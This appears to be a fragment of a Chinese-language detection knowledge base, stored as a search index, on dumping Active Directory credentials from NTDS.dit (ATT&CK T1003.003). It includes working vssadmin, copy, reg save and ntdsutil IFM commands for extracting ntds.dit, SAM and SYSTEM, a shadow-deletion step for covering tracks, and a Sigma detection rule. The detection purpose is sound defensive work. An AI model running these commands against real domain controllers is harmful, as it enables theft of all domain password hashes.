Directory\u54c8\u5e0c\u7684\u5185\u5bb9\uff1a \u4f7f\u7528 NTDSUtil \u521b\u5efa IFM \u6293\u53d6 DC \u672c\u5730\u7684 Ntds.dit \u6587\u4ef6\u3002 \u4f7f\u7528 VSS \u5377\u5f71\u590d\u5236\u8fdc\u7a0b\u8bfb\u53d6 Ntds.dit\u3002 \u4f7f\u7528 PowerSploit \u7684 Invoke-NinjaCopy \u8fdc\u7a0b\u8bfb\u53d6 Ntds.dit\uff08\u9700\u8981\u76ee\u6807 DC \u542f\u7528 PowerShell \u8fdc\u7a0b\u7ba1\u7406\uff09\u3002 \u5728 DC \u4e2d\u4f7f\u7528 Mimikatz \u8f6c\u50a8 Active Directory \u51ed\u636e\u3002 \u5728 DC \u4e2d\u4f7f\u7528 Invoke-Mimikatz \u8f6c\u50a8 Active Directory \u51ed\u636e\u3002 \u4f7f\u7528 Invoke-Mimikatz \u8fdc\u7a0b\u8f6c\u50a8 Active Directory \u51ed\u636e\u3002 \u4f7f\u7528 Mimikatz \u7684 DCSync \u529f\u80fd\u8fdc\u7a0b\u8f6c\u50a8 Active Directory \u51ed\u636e\u3002 \u6ce8\u610f\uff1a\u5982\u679c\u5df2\u7ecf\u53d1\u73b0\u4e86 Active Directory \u6570\u636e\u5e93\uff08NTDS.DIT\uff09\u7684\u526f\u672c\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u65e0\u9700\u63d0\u5347\u6743\u9650\u5373\u53ef\u4ece\u4e2d\u8f6c\u50a8\u51ed\u636e\u3002 \u8c01\u53ef\u4ee5\u8bbf\u95ee\uff1f Enterprise Admins (\u76ee\u5f55\u6797\u7ba1\u7406\u5458\u7ec4) Domain Admins(\u57df\u7ba1\u7406\u5458\u7ec4) Administrators(\u7ba1\u7406\u5458\u7ec4) Backup Operators(\u5907\u4efd\u64cd\u4f5c\u6210\u5458) Account Operators(\u8d26\u6237\u7ba1\u7406\u7ec4) Print Operators(\u6253\u5370\u673a\u64cd\u4f5c\u7ec4)","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","text":"windows sysmon\u65e5\u5fd7 Invoke-NinjaCopy -Path \u201cc:\\windows\\ntds\\ntds.dit\u201d -LocalDestination \u201cc:\\windows\\temp\\ntds.dit\u201c","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","text":"\u4e00\u65e6\u6211\u4eec\u83b7\u5f97\u4e86\u57df\u7ba1\u7406\u8bbf\u95ee\u6743\uff0c\u4ece DC \u4e2d\u63d0\u53d6\u6240\u6709\u54c8\u5e0c\u7684\u8001\u65b9\u6cd5\u5c31\u662f\u5728\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884c\u547d\u4ee4\uff0c\u5e76\u4f7f\u7528 Shadow Volume \u6216\u539f\u59cb\u62f7\u8d1d\u6280\u672f\u63d0\u53d6 ntds.dit \u6587\u4ef6\u3002 \u78c1\u76d8\u5377\u5f71\u590d\u5236\u6280\u672f \u7531\u4e8e\u6211\u4eec\u786e\u5b9e\u53ef\u4ee5\u8bbf\u95ee\u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f5c\u4e3a\u653b\u51fb\u8005\u5728\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884c\u547d\u4ee4\uff0c\u56e0\u6b64\u6211\u4eec\u5e0c\u671b\u83b7\u53d6\u5b58\u50a8\u5728 ntds.dit \u6587\u4ef6\u4e2d\u7684\u6240\u6709\u57df\u5185\u54c8\u5e0c\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u8be5\u6587\u4ef6\u4e0d\u65ad\u5730\u88ab\u8bfb\u548c\u5199\uff0c\u5373\u4f7f\u4f5c\u4e3a\u7cfb\u7edf\uff0c\u6211\u4eec\u4e5f\u65e0\u6cd5\u8bfb\u53d6\u6216\u590d\u5236\u8be5\u6587\u4ef6\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u540d\u4e3a Volume Shadow Copy Service \u78c1\u76d8\u590d\u5236\u670d\u52a1\uff08VSS\uff09\u7684 Windows \u529f\u80fd\uff0c\u8be5\u529f\u80fd\u5c06\u521b\u5efa\u78c1\u76d8\u7684\u5feb\u7167\u526f\u672c\u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4ece\u8be5\u526f\u672c\u4e2d\u8bfb\u53d6 Ntds.dit \u6587\u4ef6\u5c06\u5176\u83b7\u53d6\u51fa\u6765\u3002\u5e76\u5c06\u5176\u4ece\u8ba1\u7b97\u673a\u4e0a\u53d6\u6d88\uff0c\u8fd9\u5305\u62ec\u7a83\u53d6 Ntds.dit\u3001System\u3001SAM \u548c Boot Key \u6587\u4ef6\u3002\u6700\u540e\uff0c\u6211\u4eec\u9700\u8981\u6e05\u7406\u6211\u4eec\u7684\u884c\u8e2a\u5e76\u5220\u9664\u78c1\u76d8\u62f7\u8d1d\uff1a - C:\\vssadmin create shadow /for=C: - copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SYSTEM - copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SAM - copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\ntds\\ntds.dit - reg SAVE HKLM\\SYSTEM c:\\SYS - vssadmin list shadows - vssadmin delete shadows /for= [/oldest | /all | /shadow=]","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","text":"windows sysmon\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa\u3001\u547d\u4ee4\u884c\u53c2\u6570","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","text":"title: VSS\u5377\u5f71\u590d\u5236\u672c\u5730\u8bfb\u53d6Ntds.dit\u6587\u4ef6(\u57df\u63a7\u4e3b\u673a\u64cd\u4f5c\uff0c\u4e5f\u9002\u7528\u4e8eVSS\u5377\u5f71\u590d\u5236\u8fdc\u7a0b\u8bfb\u53d6Ntds.dit\u6587\u4ef6) description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://1sparrow.com/2018/02/19/\u57df\u6e17\u900f\u76f8\u5173/ tags: T1003-003 status: experimental author: 12306Bro logsource: product: windows service: sysmon detection: selection1: EventID: 1 # \u8fdb\u7a0b\u521b\u5efa Image: 'C:\\Windows\\System32\\vssadmin.exe' CommandLine: 'VSSADMIN.EXE' CurrentDirectory: 'vssadmin create shadow /for=C:' selection2: EventID: 1 Image: 'C:\\Windows\\System32\\reg.exe' CommandLine: 'reg.exe' CurrentDirectory: 'reg SAVE HKLM\\SYSTEM *' selection3: EventID: 1 # \u8fdb\u7a0b\u521b\u5efa Image: 'C:\\Windows\\System32\\vssadmin.exe' CommandLine: 'VSSADMIN.EXE' CurrentDirectory: 'vssadmin delete shadows /all' condition: selection1 or selection2 or selection3 level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","text":"MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 \u4ece\u6d3b\u52a8\u76ee\u5f55\u4e2d\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\u76846\u79cd\u65b9\u6cd5 https://www.4hou.com/technology/4256.html \u5982\u4f55\u5de7\u5999\u7684\u4ecentds.dit\u4e2d\u63d0\u53d6Hash\u548c\u57df\u4fe1\u606f https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/ \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6 https://xz.aliyun.com/t/2187 \u4eceNTDS.dit\u83b7\u53d6\u5bc6\u7801hash\u7684\u4e09\u79cd\u65b9\u6cd5 https://www.freebuf.com/sectool/176876.html \u4eceNTDS.dit\u6587\u4ef6\u4e2d\u63d0\u53d6\u5bc6\u7801\u54c8\u5e0c\u503c https://blog.stealthbits.com/extracting-password-hashes-from-the-ntds-dit-file/ \u653b\u51fb\u8005\u5982\u4f55\u8f6c\u50a8AD\u6570\u636e\u5e93\u51ed\u636e https://adsecurity.org/?p=2398 \u5728AD\u4e2d\u83b7\u5f97\u57df\u7ba1\u7406\u5458\u6743\u9650\u7684\u653b\u51fb\u65b9\u6cd5 https://adsecurity.org/?p=2362 \u5f3a\u529b\u63a8\u8350 \u8f6c\u50a8\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u65b9\u6cd5\u603b\u7ed3 http://ju.outofmemory.cn/entry/232676 powershell\u5f00\u542f\u8fdc\u7a0b\u7ba1\u7406\u7684\u65b9\u6cd5\u8bf7\u53c2\u8003 https://blog.51cto.com/1163739403/1826546 \u5377\u5f71\u590d\u5236NTDS.dit\u57df\u6563\u5217\u8fdc\u7a0b-\u7b2c1\u90e8\u5206 https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/ \u4eceNTDS.dit\u6587\u4ef6\u83b7\u53d6\u54c8\u5e0c https://www.swordshield.com/blog/getting-hashes-from-ntds-dit-file/ \u8f6c\u50a8\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u51ed\u8bc1\u7684\u65b9\u6cd5\u603b\u7ed3 https://blog.csdn.net/weixin_33713707/article/details/87980463","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/","text":"T1003-003-windows-\u57fa\u4e8eNTDS\u51ed\u8bc1\u8f6c\u50a82 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c NTDS.dit Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002\u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f7f\u7528NTDSUtil\u521b\u5efaIFM\u6293\u53d6DC\u672c\u5730\u7684Ntds.dit\u6587\u4ef6\u3002 NTDSUTIL\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff0c\u5728\u672c\u5730\u5de5\u4f5c\u65f6\u9700\u8981AD\u6570\u636e\u5e93\uff08NTDS.DIT\uff09\u5e76\u652f\u6301\u4e3aDCPROMO\u521b\u5efaIFM\u3002DCPROMO\u5c06\u4f7f\u7528IFM\u4ee5\u201c\u4ece\u5a92\u4f53\u4ecb\u8d28\u4e2d\u5b89\u88c5\u201d\uff0c\u8fd9\u6837\u670d\u52a1\u5668\u5c31\u4e0d\u9700\u8981\u901a\u8fc7\u7f51\u7edc\u4ece\u53e6\u4e00\u53f0 DC \u4e0a\u590d\u5236\u57df\u6570\u636e\u3002\u9002\u7528\u4e8e\uff1aWindows Server 2003\uff0cWindows Server 2003 R2\uff0c\u5e26\u6709SP1\u7684Windows Server 2003\uff0cWindows Server 2008\uff0cWindows Server 2008 R2\u3002 Ntdsutil.exe\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4e3aActive Directory\u57df\u670d\u52a1\uff08AD DS\uff09\u548cActive Directory\u8f7b\u578b\u76ee\u5f55\u670d\u52a1\uff08AD LDS\uff09\u63d0\u4f9b\u7ba1\u7406\u5de5\u5177\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528ntdsutil\u547d\u4ee4\u6765\u6267\u884cAD DS\u7684\u6570\u636e\u5e93\u7ef4\u62a4\uff0c\u7ba1\u7406\u548c\u63a7\u5236\u5355\u4e2a\u4e3b\u64cd\u4f5c\uff0c\u4ee5\u53ca\u5220\u9664\u4ece\u7f51\u7edc\u4e2d\u5220\u9664\u800c\u672a\u6b63\u786e\u5378\u8f7d\u7684\u57df\u63a7\u5236\u5668\u7559\u4e0b\u7684\u5143\u6570\u636e\u3002\u8be5\u5de5\u5177\u4ec5\u4f9b\u6709\u7ecf\u9a8c\u7684\u7ba1\u7406\u5458\u4f7f\u7528 Ntdsutil.exe\u7684\u662f\u5185\u7f6e\u5728Windows Server 2008\u548cWindows Server 2008 R2\u3002\u5982\u679c\u60a8\u5b89\u88c5\u4e86AD DS\u6216AD LDS\u670d\u52a1\u5668\u89d2\u8272\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5\u89d2\u8272\u3002\u5982\u679c\u60a8\u5b89\u88c5\u4f5c\u4e3a\u8fdc\u7a0b\u670d\u52a1\u5668\u7ba1\u7406\u5de5\u5177\uff08RSAT\uff09\u4e00\u90e8\u5206\u7684Active Directory\u57df\u670d\u52a1\u5de5\u5177\uff0c\u5b83\u4e5f\u5c06\u53ef\u7528\u3002 #!bash ntdsutil \u201cac i ntds\u201d \u201cifm\u201d \u201ccreate full c:\\temp\u201d q q IFM \u662f\u4e00\u4e2a NTDS.dit\u6587\u4ef6\u7684\u526f\u672c\uff0c\u653e\u5728 C://temp \u76ee\u5f55\u4e2d\u3002\u5f53\u521b\u5efa\u4e00\u4e2aIFM\u65f6\uff0c\u4e5f\u4f1a\u4ea7\u751f\u5e76\u6302\u8f7d\u4e00\u4e2aVSS\u5feb\u7167\uff0c\u540c\u65f6Ntds.dit\u6587\u4ef6\u548c\u76f8\u5173\u7684\u6570\u636e\u4e5f\u88ab\u590d\u5236\u5230\u76ee\u6807\u6587\u4ef6\u5939\u4e2d\u3002 \u8be5\u6587\u4ef6\u53ef\u80fd\u5b58\u50a8\u5728\u4e00\u4e2a\u6b63\u5728promot\u7684\u65b0\u7684DC\u7684\u5171\u4eab\u6587\u4ef6\u5939\u4e2d\uff0c\u4e5f\u53ef\u80fd\u51fa\u73b0\u5728\u8fd8\u6ca1\u6709promot\u7684\u65b0\u7684\u670d\u52a1\u5668\u4e0a\u3002 \u6b64\u670d\u52a1\u5668\u53ef\u80fd\u65e0\u6cd5\u786e\u4fddIFM\u6570\u636e\u7684\u5b89\u5168\uff0c\u5305\u62ec\u590d\u5236Ntds.dit\u6587\u4ef6\u5e76\u63d0\u53d6\u51ed\u8bc1\u6570\u636e\u3002\u8fd9\u4e2a\u547d\u4ee4\u4e5f\u53ef\u4ee5\u901a\u8fc7 WMI \u6216 PowerShell \u8fdc\u7a0b\u6267\u884c\u3002\uff08\u5efa\u8bae\u4f7f\u7528powershell\u6267\u884c\uff0cDOS\u547d\u4ee4\u6267\u884c\u5f02\u5e38\u9519\u8bef\uff09 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Windows\\system32\\ntdsutil.exe: ac i ntds \u6d3b\u52a8\u5b9e\u4f8b\u8bbe\u7f6e\u4e3a\u201cntds\u201d\u3002 C:\\Windows\\system32\\ntdsutil.exe: ifm ifm: create full c:\\temp \u6b63\u5728\u521b\u5efa\u5feb\u7167... \u6210\u529f\u751f\u6210\u5feb\u7167\u96c6 {ea08df62-9743-4068-aedb-a2c32dfd057f}\u3002 \u5feb\u7167 {2d92b366-961f-45f0-9202-9aa6f069139f} \u5df2\u4f5c\u4e3a C:\\$SNAP_201911011107_VOLUMEC$\\ \u88c5\u8f7d \u5df2\u88c5\u8f7d\u5feb\u7167 {2d92b366-961f-45f0-9202-9aa6f069139f}\u3002 \u6b63\u5728\u542f\u52a8\u788e\u7247\u6574\u7406\u6a21\u5f0f... \u6e90\u6570\u636e\u5e93: C:\\$SNAP_201911011107_VOLUMEC$\\Windows\\NTDS\\ntds.dit \u76ee\u6807\u6570\u636e\u5e93: c:\\temp\\Active Directory\\ntds.dit Defragmentation Status (% complete) 0 10 20 30 40 50 60 70 80 90 100 |----|----|----|----|----|----|----|----|----|----| ................................................... \u6b63\u5728\u590d\u5236\u6ce8\u518c\u8868\u6587\u4ef6... \u6b63\u5728\u590d\u5236 c:\\temp\\registry\\SYSTEM \u6b63\u5728\u590d\u5236 c:\\temp\\registry\\SECURITY \u5feb\u7167 {2d92b366-961f-45f0-9202-9aa6f069139f} \u5df2\u5378\u8f7d\u3002 \u5728 c:\\temp \u4e2d\u6210\u529f\u521b\u5efa IFM \u5a92\u4f53\u3002 ifm: q C:\\Windows\\system32\\ntdsutil.exe: q \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u5efa\u8bae\u9488\u5bf9\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u3002\u9488\u5bf9\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u76d1\u63a7\u9700\u8981\u7279\u5b9a\u7684\u73af\u5883\uff0c\u6bd4\u5982\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\u3001\u91c7\u96c6sysmon\u65e5\u5fd7\u7b49\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 NTDSutil\u7b80\u4ecb https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753343(v=ws.10)?redirectedfrom=MSDN","title":"T1003-003-windows-\u57fa\u4e8eNTDS\u51ed\u8bc1\u8f6c\u50a82"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#t1003-003-windows-ntds2","text":"","title":"T1003-003-windows-\u57fa\u4e8eNTDS\u51ed\u8bc1\u8f6c\u50a82"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#ntdsdit","text":"Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002\u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002","title":"NTDS.dit"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_1","text":"\u4f7f\u7528NTDSUtil\u521b\u5efaIFM\u6293\u53d6DC\u672c\u5730\u7684Ntds.dit\u6587\u4ef6\u3002 NTDSUTIL\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff0c\u5728\u672c\u5730\u5de5\u4f5c\u65f6\u9700\u8981AD\u6570\u636e\u5e93\uff08NTDS.DIT\uff09\u5e76\u652f\u6301\u4e3aDCPROMO\u521b\u5efaIFM\u3002DCPROMO\u5c06\u4f7f\u7528IFM\u4ee5\u201c\u4ece\u5a92\u4f53\u4ecb\u8d28\u4e2d\u5b89\u88c5\u201d\uff0c\u8fd9\u6837\u670d\u52a1\u5668\u5c31\u4e0d\u9700\u8981\u901a\u8fc7\u7f51\u7edc\u4ece\u53e6\u4e00\u53f0 DC \u4e0a\u590d\u5236\u57df\u6570\u636e\u3002\u9002\u7528\u4e8e\uff1aWindows Server 2003\uff0cWindows Server 2003 R2\uff0c\u5e26\u6709SP1\u7684Windows Server 2003\uff0cWindows Server 2008\uff0cWindows Server 2008 R2\u3002 Ntdsutil.exe\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4e3aActive Directory\u57df\u670d\u52a1\uff08AD DS\uff09\u548cActive Directory\u8f7b\u578b\u76ee\u5f55\u670d\u52a1\uff08AD LDS\uff09\u63d0\u4f9b\u7ba1\u7406\u5de5\u5177\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528ntdsutil\u547d\u4ee4\u6765\u6267\u884cAD DS\u7684\u6570\u636e\u5e93\u7ef4\u62a4\uff0c\u7ba1\u7406\u548c\u63a7\u5236\u5355\u4e2a\u4e3b\u64cd\u4f5c\uff0c\u4ee5\u53ca\u5220\u9664\u4ece\u7f51\u7edc\u4e2d\u5220\u9664\u800c\u672a\u6b63\u786e\u5378\u8f7d\u7684\u57df\u63a7\u5236\u5668\u7559\u4e0b\u7684\u5143\u6570\u636e\u3002\u8be5\u5de5\u5177\u4ec5\u4f9b\u6709\u7ecf\u9a8c\u7684\u7ba1\u7406\u5458\u4f7f\u7528 Ntdsutil.exe\u7684\u662f\u5185\u7f6e\u5728Windows Server 2008\u548cWindows Server 2008 R2\u3002\u5982\u679c\u60a8\u5b89\u88c5\u4e86AD DS\u6216AD LDS\u670d\u52a1\u5668\u89d2\u8272\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5\u89d2\u8272\u3002\u5982\u679c\u60a8\u5b89\u88c5\u4f5c\u4e3a\u8fdc\u7a0b\u670d\u52a1\u5668\u7ba1\u7406\u5de5\u5177\uff08RSAT\uff09\u4e00\u90e8\u5206\u7684Active Directory\u57df\u670d\u52a1\u5de5\u5177\uff0c\u5b83\u4e5f\u5c06\u53ef\u7528\u3002 #!bash ntdsutil \u201cac i 